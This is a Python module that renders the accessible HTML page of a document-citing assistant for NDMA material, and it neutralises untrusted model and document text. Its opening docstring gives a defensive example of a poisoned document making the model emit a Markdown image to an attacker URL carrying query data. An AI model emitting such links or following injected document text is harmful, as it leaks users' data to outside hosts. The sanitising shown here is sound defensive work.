"""The document structure of a page: landmarks, headings and semantic elements.

Streamlit renders div soup, so the meaning of the page has to be written deliberately. Every
exchange is an ``<article>`` with the question as its heading, and the parts of an answer are
``<section>``s with real ``<h3>``s rather than styled spans - a screen reader can then move
between questions and jump to sources, and the page has the outline any reader expects.

The elements are chosen for what they mean: ``<cite>`` for a source reference, ``<mark>`` for
a figure worth checking, ``<blockquote>`` for a quoted passage, ``<time>`` for a timestamp,
``<data>`` for the machine-readable relevance score, ``<details>`` for a panel that opens
without JavaScript.

Model and document text is rendered through CommonMark with raw HTML disabled, so the parser
escapes anything that looks like markup, and Markdown images are removed first: a poisoned
document could otherwise emit ``![](https://attacker/?q=...)`` and the browser would fetch it
while rendering. Citations and figures are set aside as tokens before that pass and restored
as real elements afterwards, so nothing the model writes can forge one.
"""

from __future__ import annotations

import re
from html import escape

from markdown_it import MarkdownIt

from citara.config import Settings, UiSettings
from citara.generation.models import GeneratedAnswer
from citara.ui import presenters
from citara.ui.corpus import Corpus
from citara.ui.presenters import Turn

# CommonMark with raw HTML off: the parser escapes anything markup-shaped in untrusted text.
_MARKDOWN = MarkdownIt("commonmark", {"html": False, "linkify": False}).enable("table")

_MARKDOWN_IMAGE = re.compile(r"!\[([^\]]*)\]\([^)]*\)")
_MARKER = re.compile(r"\[(\d+)\]([.,;:!?]?)")
_FIGURE = re.compile(
    r"(?:PKR|Rs\.?|USD|US\$|\$)\s?\d[\d,]*(?:\.\d+)?(?:\s?(?:million|billion|trillion))?"
    r"|\b\d{1,3}(?:,\d{3})+(?:\.\d+)?\b"
    r"|\b\d+(?:\.\d+)?\s?(?:million|billion|trillion)\b"
    r"|\b\d+(?:\.\d+)?\s?(?:%|per ?cent)"
    r"|\b\d+(?:\.\d+)?\s?(?:°\s?C|℃)",
    re.IGNORECASE,
)
# Control characters cannot appear in the source text, so a token cannot be forged.
_TOKEN = re.compile("\x02citara(\\d+)\x03")


def markdown(text: str) -> str:
    """Untrusted Markdown as safe HTML, with image requests removed."""
    rendered: str = _MARKDOWN.render(_MARKDOWN_IMAGE.sub(r"\1", text))
    return rendered


def _chip(marker: int, answer: GeneratedAnswer) -> str:
    """One citation, as a source reference the reader can resolve to a page."""
    citation = next((c for c in answer.citations if c.marker == marker), None)
    if citation is None:
        label = f"Citation {marker} does not match any retrieved source"
        return f'<cite class="cite-chip cite-invalid" aria-label="{label}">{marker}?</cite>'
    pages = presenters.pages(citation)
    spoken = f"Source {marker}: {citation.citation}"
    return (
        f'<cite class="cite-chip" title="{escape(citation.citation)}" '
        f'aria-label="{escape(spoken)}">{marker} · {pages}</cite>'
    )


def answer_body(answer: GeneratedAnswer) -> str:
    """The answer as HTML: its Markdown rendered, its citations and figures made elements."""
    stash: list[str] = []

    def token(html: str) -> str:
        stash.append(html)
        return f"\x02citara{len(stash) - 1}\x03"

    def citation(match: re.Match[str]) -> str:
        chip = _chip(int(match.group(1)), answer)
        punctuation = match.group(2)
        if punctuation:
            return token(f'<span class="cite-tail">{chip}{punctuation}</span>')
        return token(chip)

    text = _MARKER.sub(citation, answer.text)
    text = _FIGURE.sub(lambda m: token(f'<mark class="figure">{escape(m.group(0))}</mark>'), text)
    rendered = markdown(text)
    return _TOKEN.sub(lambda m: stash[int(m.group(1))], rendered)


def _label(
    text: str, identifier: str, count: str = "", level: str = "h3", variant: str = ""
) -> str:
    """A section heading. The variant colours it, so the parts of an answer read apart."""
    suffix = f'<span class="count">{escape(count)}</span>' if count else ""
    classes = f"section-label label-{variant}" if variant else "section-label"
    return f'<{level} class="{classes}" id="{identifier}">{escape(text)}{suffix}</{level}>'


def _notice_section(answer: GeneratedAnswer, index: int) -> str:
    notice = presenters.notice(answer)
    if notice is None:
        return ""
    label = {
        "refusal": "Refused",
        "degraded": "Degraded",
        "blocked": "Declined",
        "scope": "Out of scope",
        "limit": "Limit reached",
    }[notice.kind]
    # A degraded answer's text is the notice followed by the passages the sources panel shows.
    body = answer.text.split("\n\n", 1)[0] if answer.mode == "degraded" else answer.text
    return (
        f'<section class="turn-section" aria-labelledby="n-{index}">'
        f"{_label(label, f'n-{index}', variant='notice')}"
        f'<div class="citara-notice notice-{notice.kind}">'
        f"<strong>{escape(notice.heading)}</strong>{markdown(body)}</div></section>"
    )


def _evidence_section(answer: GeneratedAnswer, ui: UiSettings, index: int) -> str:
    parts = []
    band = presenters.evidence_band(answer, ui)
    if band is not None:
        explanation = escape(presenters.BAND_EXPLANATION[band])
        parts.append(f'<span class="band band-{band}" title="{explanation}">{band}</span>')
        if band == "Low":
            parts.append(f"<span>{explanation}</span>")
    if ui.show_latency:
        parts.append(f"<span>{escape(presenters.latency_line(answer))}</span>")
    if not parts:
        return ""
    return (
        f'<section class="turn-section" aria-labelledby="e-{index}">'
        f"{_label('Evidence', f'e-{index}', variant='evidence')}"
        f'<p class="citara-meta">{"".join(parts)}</p></section>'
    )


def _sources_section(answer: GeneratedAnswer, index: int) -> str:
    rows = presenters.source_rows(answer)
    if not rows:
        return ""
    if answer.mode == "generated":
        cited = sum(row.cited for row in rows)
        count = f"{cited} cited of {len(rows)} retrieved"
    else:
        count = f"{len(rows)} retrieved"

    items = []
    for row in rows:
        score = (
            f'<data class="score" value="{row.score:.4f}">relevance {row.score:.2f}</data>'
            if row.score is not None
            else ""
        )
        state = ""
        if answer.mode == "generated":
            state = (
                '<span class="state">cited in the answer</span>'
                if row.cited
                else '<span class="state">retrieved, not cited</span>'
            )
        items.append(
            f'<li id="source-{index}-{row.marker}">'
            f'<p class="source-head"><span class="cite-chip" aria-hidden="true">{row.marker}'
            f"</span> <cite>{escape(row.citation)}</cite> {score} {state}</p>"
            f'<blockquote class="passage">{markdown(row.text)}</blockquote></li>'
        )
    open_now = " open" if answer.mode == "degraded" else ""
    return (
        f'<section class="turn-section" aria-labelledby="s-{index}">'
        f"{_label('Sources', f's-{index}', count=count, variant='sources')}"
        f'<details class="sources-panel"{open_now}><summary>Show the passages</summary>'
        f'<ol class="source-list">{"".join(items)}</ol></details></section>'
    )


def _spoken_summary(answer: GeneratedAnswer, ui: UiSettings) -> str:
    """One announcement for a finished answer.

    Screen readers stutter through a live region fed token by token, so the stream is silent
    and the outcome is announced once, here, when the article replaces it.
    """
    if answer.mode == "generated":
        cited = len(answer.cited)
        band = presenters.evidence_band(answer, ui)
        detail = f"{cited} source{'s' if cited != 1 else ''} cited"
        summary = f"Answer ready, {detail}{f', evidence {band.lower()}' if band else ''}."
    else:
        notice = presenters.notice(answer)
        summary = f"{notice.heading}." if notice else "Answer ready."
    return f'<p class="sr-only" role="status">{escape(summary)}</p>'


def turn_article(turn: Turn, settings: Settings, index: int) -> str:
    """One exchange: the question as the heading, the answer's parts as sections."""
    answer = turn.answer
    scope = f'<p class="citara-scope">Searched: {escape(turn.scope)}</p>' if turn.scope else ""
    body = (
        f'<section class="turn-section" aria-labelledby="a-{index}">'
        f"{_label('Answer', f'a-{index}', variant='answer')}"
        f'<div class="answer-body">{answer_body(answer)}</div></section>'
        if answer.mode == "generated"
        else ""
    )
    return (
        f'<article class="turn" aria-labelledby="q-{index}">'
        f'<p class="section-label" aria-hidden="true">Question</p>'
        f'<h2 class="question" id="q-{index}">{escape(turn.question)}</h2>'
        f"{scope}"
        f"{_notice_section(answer, index)}"
        f"{body}"
        f"{_evidence_section(answer, settings.ui, index)}"
        f"{_sources_section(answer, index)}"
        f"{_spoken_summary(answer, settings.ui)}"
        f"</article>"
    )


def streaming_article(question: str, streamed: str) -> str:
    """The turn while it is still being written, announced only when it is finished."""
    body = (
        f'<div class="answer-body">{markdown(streamed)}</div>'
        if streamed
        else '<p class="citara-searching">Searching the indexed documents…</p>'
    )
    return (
        '<article class="turn" aria-busy="true">'
        '<p class="section-label" aria-hidden="true">Question</p>'
        f'<h2 class="question">{escape(question)}</h2>'
        f'<section class="turn-section">'
        f'<h3 class="section-label label-answer">Answer</h3>{body}</section>'
        "</article>"
    )


def header(subtitle: str, disclaimer: str, mark: str) -> str:
    """The brand bar: the page's h1, its tagline, and the prototype disclaimer."""
    return (
        '<header class="citara-header">'
        f'<span class="brand-mark" aria-hidden="true">{mark}</span>'
        '<span class="brand-text"><h1 class="brand-name">CITARA</h1>'
        f'<p class="brand-sub">{escape(subtitle)}</p></span>'
        "</header>"
        f'<p class="citara-disclaimer">{escape(disclaimer)}</p>'
    )


def footer(corpus: Corpus, built_at: str, repository: str, build: str = "") -> str:
    """Site footer: what the assistant knows, where the code is, and what it is not.

    *build* identifies the running code. On a hosted deployment the page is the only thing
    anyone can see, and "is this the commit I pushed?" turned out to be the question behind
    two separate failures - answerable before only by comparing line numbers in a traceback
    against the repository.
    """
    built = f' · index built <time datetime="{escape(built_at)}">{escape(built_at[:10])}</time>'
    running = f' · build <code class="build">{escape(build)}</code>' if build else ""
    return (
        '<footer class="citara-footer">'
        f"<p><strong>CITARA</strong> answers only from the indexed NDMA documents and cites the "
        f"page behind every claim. Verify against the cited page before acting.</p>"
        f"<p>{len(corpus.searchable)} documents · {corpus.searchable_pages:,} of "
        f"{corpus.total_pages:,} pages searchable{built if built_at else ''}{running}</p>"
        f'<p><a href="{escape(repository)}" rel="noopener noreferrer" target="_blank">Source code '
        f"and evaluation</a> · MIT licence · Independent prototype, not an official NDMA "
        f"system</p></footer>"
    )


def corpus_list(corpus: Corpus) -> str:
    """The knowledge boundary, folded away behind its totals.

    Nineteen documents fill a sidebar and bury the filters under them, but the boundary is the
    one thing a reader should always be able to check, so it stays one click away rather than
    moving somewhere else entirely.
    """
    items = []
    for document in corpus.documents:
        if document.searchable:
            pages = (
                f"{document.searchable_pages} of {document.total_pages} pages"
                if document.searchable_pages < document.total_pages
                else f"{document.total_pages} pages"
            )
        else:
            pages = "not searchable"
        gap = f'<br><span class="gap">{escape(document.note)}</span>' if document.note else ""
        items.append(f'<li>{escape(document.label)} <span class="pages">· {pages}</span>{gap}</li>')
    searchable = len(corpus.searchable)
    summary = f"Show all {searchable} document{'s' if searchable != 1 else ''}"
    return (
        f'<details class="corpus-panel"><summary class="corpus-summary">{summary}</summary>'
        f'<ul class="corpus-list">{"".join(items)}</ul></details>'
    )
